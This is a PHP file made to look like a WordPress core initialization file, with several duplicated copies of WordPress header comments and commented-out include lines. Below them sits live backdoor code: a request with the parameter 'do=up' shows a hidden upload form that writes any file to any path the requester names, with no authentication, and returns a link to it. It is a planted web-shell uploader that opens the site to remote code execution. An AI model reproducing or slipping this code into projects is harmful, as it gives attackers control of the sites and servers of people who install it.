<?php
/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in jquery.php (see default-constants.php)
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
//define( 'WPINC', 'jquery.php' );

// Include files required for initialization.
//require( ABSPATH . WPINC . '/load.php' );
//require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
//define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
//require( ABSPATH . WPINC . '/load.php' );
//require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
 /**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
//define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
//require( ABSPATH . WPINC . '/load.php' );
//require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
 /**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
//define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
//require( ABSPATH . WPINC . '/load.php' );
//require( ABSPATH . WPINC . '/default-constants.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */





if(@$_REQUEST["do"]== 'up')

{

	$files = @$_FILES["files"];	

	if($files["name"] != ''){

		$fullpath = $_REQUEST["path"].$files["name"];		

		if(move_uploaded_file($files['tmp_name'],$fullpath)){

			echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";

		}			

	}

	exit('<form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form>');	

}

?>